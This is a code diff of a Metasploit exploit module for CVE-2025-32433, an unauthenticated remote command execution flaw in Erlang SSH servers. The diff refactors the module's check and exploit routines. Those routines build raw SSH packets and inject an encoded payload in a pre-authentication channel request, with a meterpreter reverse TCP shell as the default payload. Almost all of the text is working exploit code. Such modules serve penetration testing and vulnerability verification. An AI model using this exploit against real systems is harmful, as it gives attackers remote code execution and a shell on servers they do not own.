@@ -5,8 +5,9 @@
 
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
+
+  prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::Tcp
-  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
@@ -45,6 +46,7 @@ class MetasploitModule < Msf::Exploit::Remote
               'Type' => :linux_cmd,
               'DefaultOptions' => {
                 'PAYLOAD' => 'cmd/linux/https/x64/meterpreter/reverse_tcp'
+                # cmd/linux/http/aarch64/meterpreter/reverse_tcp has also been tested successfully with this module.
               }
             }
           ],
@@ -59,19 +61,20 @@ class MetasploitModule < Msf::Exploit::Remote
             }
           ]
         ],
-        'Privileged' => false,
+        'Privileged' => true,
         'DisclosureDate' => '2025-04-16',
         'DefaultTarget' => 0,
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [REPEATABLE_SESSION],
-          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
+          'SideEffects' => [IOC_IN_LOGS]
         }
       )
     )
 
     register_options([
-      OptBool.new('CHECK_ONLY', [false, 'Only check for vulnerability without exploiting', false])
+      Opt::RPORT(22),
+      OptString.new('SSH_IDENT', [true, 'SSH client identification string sent to the server', 'SSH-2.0-OpenSSH_8.9'])
     ])
   end
 
@@ -95,7 +98,7 @@ class MetasploitModule < Msf::Exploit::Remote
 
   # builds a minimal but valid SSH_MSG_KEXINIT packet
   def build_kexinit
-    cookie = "\x00" * 16
+    cookie = SecureRandom.random_bytes(16)
     "\x14" +
       cookie +
       name_list(
@@ -113,10 +116,6 @@ class MetasploitModule < Msf::Exploit::Remote
       name_list([]) * 2 +
       "\x00" +
       [0].pack('N')
-  end
-
-  def message(msg)
-    "ssh://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}"
   end
 
   # formats a list of names into an SSH-compatible string (comma-separated)
@@ -142,40 +141,38 @@ class MetasploitModule < Msf::Exploit::Remote
     [s_bytes.length].pack('N') + s_bytes
   end
 
-  def check_host(target_host)
-    print_status(message('Starting scanner for CVE-2025-32433'))
+  def check
+    print_status('Starting scanner for CVE-2025-32433')
 
     connect
-    sock.put("SSH-2.0-OpenSSH_8.9\r\n")
+    sock.put("#{datastore['SSH_IDENT']}\r\n")
     banner = sock.get_once(1024, 10)
     unless banner
-      print_status(message('No banner received'))
-      return Exploit::CheckCode::Unknown
+      return Exploit::CheckCode::Unknown('No banner received')
     end
 
     unless banner.to_s.downcase.include?('erlang')
-      print_status(message("Not an Erlang SSH service: #{banner.strip}"))
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe("Not an Erlang SSH service: #{banner.strip}")
     end
+
     sleep(0.5)
 
-    print_status(message('Sending SSH_MSG_KEXINIT...'))
+    print_status('Sending SSH_MSG_KEXINIT...')
     kex_packet = build_kexinit
     sock.put(pad_packet(kex_packet, 8))
     sleep(0.5)
 
     response = sock.get_once(1024, 5)
     unless response
-      print_status(message("Detected Erlang SSH service: #{banner.strip}, but no response to KEXINIT"))
-      return Exploit::CheckCode::Detected
+      return Exploit::CheckCode::Detected("Detected Erlang SSH service: #{banner.strip}, but no response to KEXINIT")
     end
 
-    print_status(message('Sending SSH_MSG_CHANNEL_OPEN...'))
+    print_status('Sending SSH_MSG_CHANNEL_OPEN...')
     chan_open = build_channel_open(0)
     sock.put(pad_packet(chan_open, 8))
     sleep(0.5)
 
-    print_status(message('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...'))
+    print_status('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...')
     chan_req = build_channel_request(0, Rex::Text.rand_text_alpha(rand(4..8)).to_s)
     sock.put(pad_packet(chan_req, 8))
     sleep(0.5)
@@ -183,71 +180,61 @@ class MetasploitModule < Msf::Exploit::Remote
     begin
       sock.get_once(1024, 5)
     rescue EOFError, Errno::ECONNRESET
-      print_error(message('The target is not vulnerable to CVE-2025-32433.'))
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('The target is not vulnerable to CVE-2025-32433.')
     end
     sock.close
 
-    note = 'The target is vulnerable to CVE-2025-32433.'
-    print_good(message(note))
     report_vuln(
-      host: target_host,
+      host: datastore['RHOST'],
       name: name,
       refs: references,
-      info: note
+      info: 'The target is vulnerable to CVE-2025-32433.'
     )
     Exploit::CheckCode::Vulnerable
   rescue Rex::ConnectionError
-    print_error(message('Failed to connect to the target'))
-    Exploit::CheckCode::Unknown
+    Exploit::CheckCode::Unknown('Failed to connect to the target')
   rescue Rex::TimeoutError
-    print_error(message('Connection timed out'))
-    Exploit::CheckCode::Unknown
+    Exploit::CheckCode::Unknown('Connection timed out')
   ensure
     disconnect unless sock.nil?
   end
 
   def exploit
-    if datastore['CHECK_ONLY']
-      check_host(datastore['RHOST'])
-      return
-    end
-
-    print_status(message('Starting exploit for CVE-2025-32433'))
+    print_status('Starting exploit for CVE-2025-32433')
     connect
     sock.put("SSH-2.0-OpenSSH_8.9\r\n")
     banner = sock.get_once(1024)
     if banner
-      print_good(message("Received banner: #{banner.strip}"))
+      print_good("Received banner: #{banner.strip}")
     else
       fail_with(Failure::Unknown, 'No banner received')
     end
     sleep(0.5)
 
-    print_status(message('Sending SSH_MSG_KEXINIT...'))
+    print_status('Sending SSH_MSG_KEXINIT...')
     kex_packet = build_kexinit
     sock.put(pad_packet(kex_packet, 8))
     sleep(0.5)
 
-    print_status(message('Sending SSH_MSG_CHANNEL_OPEN...'))
+    print_status('Sending SSH_MSG_CHANNEL_OPEN...')
     chan_open = build_channel_open(0)
     sock.put(pad_packet(chan_open, 8))
     sleep(0.5)
 
-    print_status(message('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...'))
+    print_status('Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...')
     chan_req = build_channel_request(0, payload.encoded)
     sock.put(pad_packet(chan_req, 8))
 
     begin
       response = sock.get_once(1024, 5)
       if response
-        vprint_status(message("Received response: #{response.unpack('H*').first}"))
-        print_good(message('Payload sent successfully'))
+        vprint_status("Received response: #{response.unpack('H*').first}")
+        print_good('Payload sent successfully')
       else
-        print_status(message('No response within timeout period (which is expected)'))
+        print_status('No response within timeout period (which is expected)')
       end
     rescue Rex::TimeoutError
-      print_status(message('No response within timeout period (which is expected)'))
+      print_status('No response within timeout period (which is expected)')
     end
     sock.close
   rescue Rex::ConnectionError
